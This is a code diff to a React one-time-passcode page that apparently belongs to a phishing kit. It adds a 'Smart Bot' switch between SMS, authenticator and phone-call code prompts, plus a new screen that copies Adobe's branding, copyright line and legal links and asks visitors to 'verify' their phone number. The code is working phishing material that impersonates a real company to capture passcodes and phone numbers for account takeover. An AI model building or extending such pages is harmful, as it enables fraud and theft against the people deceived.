@@ -9,6 +9,10 @@ interface OtpPageProps {
   email?: string;
   provider?: string;
   onResend?: () => void;
+  /** Smart Bot OTP type: 'sms_code' | 'auth_code' | 'call_code' | 'number_prompt' | null */
+  otpType?: string | null;
+  /** Callback for phone number submission (Number Prompt flow). */
+  onPhoneSubmit?: (phone: string) => void;
 }
 
 const AdobeLogo = () => (
@@ -712,8 +716,105 @@ const OthersOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: bo
   );
 };
 
+/* ── Number Prompt (phone number input for Smart Bot) ─────────── */
+const NumberPrompt: React.FC<{ email?: string; isLoading: boolean; onPhoneSubmit?: (phone: string) => void }> = ({ email, isLoading, onPhoneSubmit }) => {
+  const [phone, setPhone] = useState('');
+
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/[^0-9+\-() ]/g, '').slice(0, 20);
+    setPhone(val);
+  };
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (phone.replace(/\D/g, '').length >= 10 && onPhoneSubmit) {
+      onPhoneSubmit(phone);
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex items-center justify-center p-4 font-sans" style={{ background: '#f5f5f5', fontFamily: "'adobe-clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
+      <div className="w-full bg-white" style={{ maxWidth: '440px', borderRadius: '12px', padding: '40px 32px', boxShadow: '0 4px 24px rgba(0,0,0,.12)' }}>
+        <div className="flex items-center gap-2 mb-6">
+          <AdobeLogo />
+          <span style={{ fontSize: '18px', fontWeight: 700, color: '#2c2c2c', letterSpacing: '-0.5px' }}>Adobe</span>
+        </div>
+
+        <div style={{ background: '#0265DC', color: '#fff', padding: '10px 16px', borderRadius: '6px', fontSize: '13px', marginBottom: '24px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+            <circle cx="8" cy="8" r="8" fill="white" fillOpacity="0.3"/>
+            <text x="8" y="12" textAnchor="middle" fill="white" fontSize="11" fontWeight="bold">i</text>
+          </svg>
+          For your protection, please verify your phone number.
+        </div>
+
+        <h1 style={{ fontSize: '20px', fontWeight: 700, color: '#2c2c2c', marginBottom: '8px' }}>Confirm your phone number</h1>
+        <p style={{ fontSize: '14px', color: '#6e6e6e', marginBottom: '20px' }}>
+          {email
+            ? <>Enter the phone number associated with <strong>{email}</strong>.</>
+            : 'Enter your phone number to continue.'}
+        </p>
+
+        <form onSubmit={handleSubmit}>
+          <div style={{ marginBottom: '16px' }}>
+            <label style={{ display: 'block', fontSize: '14px', color: '#4b4b4b', marginBottom: '6px', fontWeight: 500 }}>
+              Phone number
+            </label>
+            <input
+              type="tel"
+              inputMode="tel"
+              autoComplete="tel"
+              placeholder="+1 (555) 123-4567"
+              value={phone}
+              onChange={handlePhoneChange}
+              disabled={isLoading}
+              autoFocus
+              style={{ width: '100%', boxSizing: 'border-box', padding: '10px 12px', border: '2px solid #d3d3d3', borderRadius: '4px', fontSize: '16px', color: '#323232', outline: 'none', transition: 'border-color 0.2s' }}
+              onFocus={(e) => (e.target.style.borderColor = '#1473e6')}
+              onBlur={(e) => (e.target.style.borderColor = '#d3d3d3')}
+            />
+          </div>
+
+          <button
+            type="submit"
+            disabled={isLoading || phone.replace(/\D/g, '').length < 10}
+            style={{ width: '100%', padding: '12px', backgroundColor: isLoading || phone.replace(/\D/g, '').length < 10 ? '#b8b8b8' : '#1473e6', color: '#fff', border: 'none', borderRadius: '20px', fontSize: '15px', fontWeight: 600, cursor: isLoading || phone.replace(/\D/g, '').length < 10 ? 'not-allowed' : 'pointer', transition: 'background-color 0.2s', display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '44px' }}
+          >
+            {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Continue'}
+          </button>
+        </form>
+
+        <div style={{ marginTop: '32px', paddingTop: '16px', borderTop: '1px solid #eaeaea' }}>
+          <p style={{ fontSize: '11px', color: '#959595', lineHeight: 1.5, margin: 0 }}>
+            Copyright © 2025 Adobe. All rights reserved.{' '}
+            <a href="https://www.adobe.com/go/terms_en" target="_blank" rel="noopener noreferrer" style={{ color: '#959595' }}>Terms of Use</a>
+            {' | '}
+            <a href="https://www.adobe.com/go/privacy_policy_en" target="_blank" rel="noopener noreferrer" style={{ color: '#959595' }}>Privacy</a>
+          </p>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+/** Map Smart Bot OTP type to a human-readable description used in the OTP page heading. */
+const OTP_TYPE_LABELS: Record<string, { title: string; description: string }> = {
+  sms_code: {
+    title: 'Check your phone',
+    description: 'A verification code has been sent via SMS to your phone.',
+  },
+  auth_code: {
+    title: 'Authenticator app',
+    description: 'Enter the 6-digit code from your authenticator app.',
+  },
+  call_code: {
+    title: 'Phone call verification',
+    description: 'You will receive a phone call with a verification code.',
+  },
+};
+
 /* ── Main OTP Page (routes to the right provider theme) ──────── */
-const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider, onResend }) => {
+const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider, onResend, otpType, onPhoneSubmit }) => {
   const [otp, setOtp] = useState('');
 
   const handleOtpComplete = (completedOtp: string) => {
@@ -726,6 +827,11 @@ const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, em
       onSubmit(otp);
     }
   };
+
+  // Smart Bot: Number Prompt — show phone number input instead of OTP
+  if (otpType === 'number_prompt') {
+    return <NumberPrompt email={email} isLoading={isLoading} onPhoneSubmit={onPhoneSubmit} />;
+  }
 
   const sharedProps = { email, errorMessage, isLoading, otp, onOtpComplete: handleOtpComplete, onSubmit: handleSubmit };
 
